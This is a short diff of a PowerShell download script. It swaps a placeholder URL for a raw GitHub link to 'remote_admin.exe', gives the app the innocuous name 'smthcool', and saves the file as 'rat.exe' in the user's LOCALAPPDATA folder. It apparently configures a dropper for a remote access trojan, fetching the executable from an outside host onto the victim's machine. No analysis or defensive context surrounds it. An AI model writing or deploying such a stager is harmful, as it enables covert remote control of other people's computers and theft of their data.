@@ -1,6 +1,6 @@
-$url = "https://example.com/yourapp.exe"
+$url = "https://github.com/leone0988/somthing-cool/raw/refs/heads/main/remote_admin.exe"
 $dest = "$env:LOCALAPPDATA\smthcool\rat.exe"
-$name = "YourApp"
+$name = "smthcool"
 
 New-Item -ItemType Directory -Path (Split-Path $dest) -Force | Out-Null
 Invoke-WebRequest -Uri $url -OutFile $dest
